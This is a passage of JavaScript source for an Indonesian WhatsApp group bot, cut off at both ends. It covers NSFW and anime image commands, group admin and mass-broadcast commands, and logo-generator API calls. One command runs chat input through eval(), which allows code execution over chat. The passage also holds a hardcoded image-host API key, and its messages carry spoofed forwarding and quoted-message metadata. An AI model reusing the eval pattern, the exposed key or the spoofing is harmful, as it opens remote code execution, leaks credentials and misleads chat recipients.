					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'blowjob2':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'megumin':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case 'trapnime':
					if (!isNsfw) return reply(lang.nsfwmo())
					reply(lang.wait())
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break

/*
]=====> GROUP MENU<=====[
*/
  
			/* case 'add':  
                    if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
                if (args.length < 1) return reply('Yang mau di add?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang itu dah di grup sayangg')
else if(inv[0].code == 403){
alpha.sendMessage(from, `User private\n\nMengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendMessage(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
					break 
					case 'radd': case 'addreply':
if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!,btw lu jahad bet`)
break

case 'rkick': case 'kickreply':
if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break*/
			case 'antilink':
              if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
              if (args[0].toLowerCase() === 'on'){
              if (isAntiLink) return reply(lang.anjawaUdhOn(command))
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOn(command))
              } else if (args[0].toLowerCase() === 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply(lang.anjawaOff(command))
              } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Choose one`, [
            {
              buttonId: 'antilink on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antilink off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
       case 'event':
					if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !isOwner && !isCreator && !mek.key.fromMe && !isBotGroupAdmins) return reply("Buat admin doang");
					if (args[0] == "on") {
						if (isEventon) return reply(lang.anjawaUdhOn(command))
						event.push(from)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOn(command))
					} else if (args[0] == "off") {
						event.splice(from, 1)
						fs.writeFileSync('./src/event.json', JSON.stringify(event))
						reply(lang.anjawaOff(command))
					} else if (!q) {
          sendButMessage(from, `MODE EVENT`, `Choose one`, [
            {
              buttonId: 'event on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'event off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
	case 'antivirtex':
        if (!isGroup && !isGroupAdmins && !isBotGroupAdmins) return reply(lang.botNotAdm())
        if (args[0] == "on") {
          if (isAntivirtex) return reply(lang.anjawaUdhOn(command))
          antivirtex.push(from);
          fs.writeFileSync(
            "./src/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply(lang.anjawaOn(command))
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./src/antivirtex.json", JSON.stringify(ant));
          reply(lang.anjawaOff(command))
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Choose one`, [
            {
              buttonId: 'antivirtex on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antivirtex off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
			case 'kick2':
			if (!isGroupAdmins && !isBotGroupAdmins) return reply("Khusus admin");
				var mentionedd = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentionedd.length > 1) {
					teks = ''
					for (let _ of mentionedd) {
					teks += `byeee🏃 :\n`
					teks += `@_.split('@')[0]`
					}
					mentions(teks, mentionedd, true)
					alpha.groupRemove(from, mentionedd)
					} else {
					reply('Tag orang yang mau di kick')
					}
                break
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (!isGroupAdmins && !isBotGroupAdmins) return reply("lawak bang padahal lu bukan admin");
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(25)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup(lang.success())
					break
            case 'leave':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Byeee 👋```')
					}, 0)
					break       
           case 'getpp':
				if (mek.message.extendedTextMessage != undefined){
					let mentioneddd = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioneddd[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seeer = `Nama : *${pushname}`
					thumbb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, thumbb ,image, anuu)
				}
				break
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply(lang.erorLink())
		             }
		             break
			case 'return':
			case 'cek':
			case 'me':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: ftroli})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (args.length < 1) return reply('```TEXT?```')
					arg = args.join(' ');
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					await alpha.sendMessage(_.jid, bc, image, {thumbnail: bc, quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${arg}`})
					}
					fakegroup(lang.successBc())
					} else {
					await ini_bc_pc_bang(arg)
					fakegroup(lang.successBc())
					}
					break
			case 'bcgc':
					case 'bcgroup':
					case 'bcgrup':
					case 'broadcastgrup':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:\n${prefix}bcgroup [isi chat]`)
                    var group = await alpha.groupMetadata(from)
			ini_bc = args.join(' ')
		var groupz = await alpha.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`\`\`\`[ ! ]\`\`\` Broadcast in progress! Total: ${groupz.length} groups`)
                    await ini_bc_gc_bang(ini_bc)
					reply(`\`\`\`[ ✓ ] Success broadcast : ${groupz.length} groups\`\`\``)
					break
			case 'buggc':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case 'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(lang.onlygc())
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
			case 'ghstalk': 
            case 'githubstalk': 
            case 'ghuser':
               {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(lang.wait())
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `*GITHUB STALKING*

*Data Berhasil Didapatkan!*
▷ Username : ${login}
▷ Name : ${name}
▷ Followers : ${followers}
▷ Following : ${following}
▷ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Public Gists : ${public_gists}
▷ Public Repos : ${public_repos}
▷ Twitter : ${twitter_username}
▷ Email : ${email}
▷ Location : ${location}
▷ Blog : ${blog}
▷ Link : ${html_url}
▷ Bio :\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, mek)
                      })
                .catch((err) => {
                    sendMess(owner, 'Error : ' + err)
                    console.log(color('[ EXEC ]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
              case 'smeme': 
					arg = args.join(' ');
					top = arg.split('|')[0]
					bottom = arg.split('|')[1]
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length > 0) {
					let dger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					owigi = await  alpha.downloadAndSaveMediaMessage(dger)
					oanu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owigi)
					oteks = `${oanu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					var anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${oteks}`
					var smeme = await getBuffer(anu2)
					alpha.sendMessage(from, smeme, image, {thumbnail: Buffer.alloc(0)})
					} else {
					reply('Gunakan foto!')
					}
					break
			case 'demoteall':
			if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
			                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
			                alpha.groupDemoteAdmin(from, members_id)
			                break
			case 'promoteall':
			if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                alpha.groupMakeAdmin(from, members_id)
                break
              case 'promote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Promote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(from, mentioned, true)
						alpha.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
						alpha.groupMakeAdmin(from, mentioned)
					}
					break
				case 'demote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Demote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						alpha.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`, mentioned, true)
						alpha.groupDemoteAdmin(from, mentioned)
					}
					break
                
                /*
                ]----------------------------------------------------------------> API ZEKS <----------------------------------------------------------------[
                */
                
       case 'tahta':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   tahta = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   tahtah = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(tahta, tahtah, sender)
                  break
       case 'neon2':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   neon2 = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
                   neon2p = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(neon2, neon2p, sender)
                   break                    
       case 'wall':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   wall = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
                   wallp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(wall, wallp, sender)
                   break   
       case 'wolf':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   wolf = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=${F1}&text2=${F2}`)
                   wolfp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(wolf, wolfp, sender)
                   break   
       case 'tfire':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   tfire = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
                   tfirep = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(tfire, tfirep, sender)
                   break  
       case 'ytgold':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytgold = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytgoldp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytgold, ytgoldp, sender)
                   break  
       case 'ytsilver':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytsilver = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytsilverp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytsilver, ytsilverp, sender)
                   break  
       case 't3d':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   t3d = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
                   t3dp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(t3d, t3dp, sender)
                   break  
       case 'logoa':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   logoa = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   logoap = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(logoa, logoap, sender)
                   break  
       case 'pornhub':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   pornhub = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   pornhubp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(pornhub, pornhubp, sender)
                   break  
       case 'marvel':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   marvel = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   marvelp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(marvel, marvelp, sender)
                   break  
       case 'leavest':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   leavest = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
                   leavestp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(leavest, leavestp, sender)
                   break  
       case 'phcoment':  
                   if (args.length < 1) return reply(lang.tahta(prefix, command))
                   var F = q
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(lang.wait())
                   phcoment = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                   phcomentp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(phcoment, phcomentp, sender)
                   break  
         case 'naruto': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					naruto = args.join(' ')
					narutop = await getBuffer(`${ApiZeks}/api/naruto?text=${naruto}&apikey=${zeksApikey}`, {method: 'get'})
					narutopp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(narutop, narutopp, sender)
                   break  
		case 'blueneon': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					blueneon = args.join(' ')
					blueneonp = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${blueneon}`)
					blueneonpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(blueneonp, blueneonpp, sender)
                   break  
		case 'matrix': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					matrix = args.join(' ')
					matrixp = await getBuffer(`${ApiZeks}/api/matrix?apikey=${zeksApikey}&text=${matrix}`)
					matrixpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(matrixp, matrixpp, sender)
                   break  
		case 'greenneon': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					greenneon = args.join(' ')
					greenneonp = await getBuffer(`${ApiZeks}/api/gneon?apikey=${zeksApikey}&text=${greenneon}`)
					greenneonpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(greenneonp, greenneonpp, sender)
                   break  
					case 'dropwater': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					dropwater = args.join(' ')
					dropwaterp = await getBuffer(`${ApiZeks}/api/dropwater?apikey=${zeksApikey}&text=${dropwater}`)
					dropwaterpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(dropwaterp, dropwaterpp, sender)
                   break  
					case 'wolflogo': 
					if (args.length < 1) return reply(lang.tahta(prefix, command))
					wolflogo = args.join(' ')
					wolf = wolflogo.split("|")[0];
					logo = wolflogo.split("|")[1];
					wolflogop = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=${wolf}&text2=${logo}`)
					wolflogopp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(wolflogop, wolflogopp, sender)
                   break  
					case 'flowertext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					flowertext = args.join(' ')
					flowertextp = await getBuffer(`${ApiZeks}/api/flowertext?text=${flowertext}&apikey=${zeksApikey}`)
					flowertextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(flowertextp, flowertextpp, sender)
                   break  
					case 'crosslogo': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					crosslogo = args.join(' ')
					crosslogop = await getBuffer(`${ApiZeks}/api/crosslogo?text=${crosslogo}&apikey=${zeksApikey}`)
					crosslogopp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(crosslogop, crosslogopp, sender)
                   break  
					case 'silktext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					silktext = args.join(' ')
					silktextp = await getBuffer(`${ApiZeks}/api/silktext?text=${silktext}&apikey=${zeksApikey}`, {method: 'get'})
					silktextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(silktextp, silktextpp, sender)
                   break  
					case 'flametext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					flametext = args.join(' ')
					flametextp = await getBuffer(`${ApiZeks}/api/flametext?text=${flametext}&apikey=${zeksApikey}`, {method: 'get'})
					flametextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(flametextp, flametextpp, sender)
                   break  
					case 'glowtext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					glowtext = args.join(' ')
					glowtextp = await getBuffer(`${ApiZeks}/api/glowtext?text=${glowtext}&apikey=${zeksApikey}`, {method: 'get'})
					glowtextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(glowtextp, glowtextpp, sender)
                   break  
					case 'smoketext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					smoketext = args.join(' ')
					smoketextp = await getBuffer(`${ApiZeks}/api/smoketext?text=${smoketext}&apikey=${zeksApikey}`, {method: 'get'})
					smoketextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(smoketextp, smoketextpp, sender)
                   break  
					case 'pubglogo': 
					if (args.length < 1) return reply(lang.tahta(prefix, command))
					pubglogo = args.join(' ')
					wolf = pubglogo.split("|")[0];
					logo = pubglogo.split("|")[1];
					pubglogop = await getBuffer(`${ApiZeks}/api/pubglogo?text1=${wolf}&text2=${logo}&apikey=${zeksApikey}`, {method: 'get'})
					pubglogopp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(pubglogop, pubglogopp, sender)
                   break  
					case 'skytext': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					skytext = args.join(' ')
					skytextp = await getBuffer(`${ApiZeks}/api/skytext?text=${skytext}&apikey=${zeksApikey}`, {method: 'get'})
					skytextpp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(skytextp, skytextpp, sender)
                   break  
					case 'cslogo': 
					if (args.length < 1) return reply(lang.noteks(prefix, command))
					cslogo = args.join(' ')
					cslogop = await getBuffer(`${ApiZeks}/api/cslogo?text=${cslogo}&apikey=${zeksApikey}`, {method: 'get'})
					cslogopp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(cslogop, cslogopp, sender)
                   break  
		case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
